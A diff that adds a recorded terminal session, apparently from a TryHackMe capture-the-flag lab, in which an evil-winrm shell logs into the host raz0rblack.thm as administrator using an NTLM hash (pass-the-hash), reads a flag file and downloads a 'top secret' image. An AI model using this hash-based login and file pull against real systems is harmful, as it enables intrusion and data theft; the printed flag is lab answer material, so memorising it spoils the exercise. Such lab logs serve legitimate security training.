@@ -1,0 +1,99 @@
+Script started on 2025-04-08 17:35:38+03:00 [COMMAND="evil-winrm -i raz0rblack.thm -u administrator -H 9689931bed40ca5a2ce1218210177f0c" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="104" LINES="27"]
+                                        
+[0;34mEvil-WinRM shell v3.7[0m
+                                        
+[0;1;33mWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine[0m
+                                        
+[0;35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion[0m
+                                        
+[0;34mInfo: Establishing connection to remote endpoint[0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> cd ..\..
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/25/2021   1:25 PM                Administrator
+d-----        2/25/2021  10:16 AM                lvetrova
+d-r---        2/23/2021   6:21 AM                Public
+d-----        2/25/2021  10:20 AM                twilliams
+d-----        2/25/2021   9:34 AM                xyan1d3
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users> cd twilliams
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\twilliams> dir
+
+
+    Directory: C:\Users\twilliams
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018  12:19 AM                Desktop
+d-r---        2/25/2021  10:18 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_de
+                                                 finitely_definitely_not_a_flag.exe
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\twilliams> dir
+
+
+    Directory: C:\Users\twilliams
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018  12:19 AM                Desktop
+d-r---        2/25/2021  10:18 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_de
+                                                 finitely_definitely_not_a_flag.exe
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\twilliams> type type .\definitely_definitely_definitely_definitely_definitely_d efinitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_defini tely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
+A positional parameter cannot be found that accepts argument '.\definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe'.
+At line:1 char:1
++ type type .\definitely_definitely_definitely_definitely_definitely_de ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Get-Content], ParameterBindingException
+    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell.Commands.GetContentCommand
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\twilliams> type .\definitely_definitely_definitely_definitely_definitely_defini tely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_ definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
+THM{5144f2c4107b7cab04916724e3749fb0}
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\twilliams> cd "C:\Program Files\Top Secret"
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Program Files\Top Secret> dir
+
+
+    Directory: C:\Program Files\Top Secret
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        2/25/2021  10:13 AM         449195 top_secret.png
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Program Files\Top Secret> download top_secret.png
+                                        
+[0;34mInfo: Downloading C:\Program Files\Top Secret\top_secret.png to top_secret.png[0m
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;34mInfo: Download successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Program Files\Top Secret> exit
+                                        
+[0;34mInfo: Exiting with code 0[0m
+
+Script done on 2025-04-08 17:42:30+03:00 [COMMAND_EXIT_CODE="0"]
